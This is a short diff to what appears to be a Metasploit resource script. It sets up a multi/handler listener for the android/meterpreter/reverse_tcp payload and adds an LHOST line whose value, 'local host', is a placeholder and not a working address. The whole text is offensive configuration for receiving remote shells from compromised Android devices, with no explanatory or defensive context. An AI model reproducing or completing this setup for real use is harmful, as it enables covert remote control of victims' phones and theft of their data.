@@ -1,3 +1,4 @@
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
+set LHOST local host
 
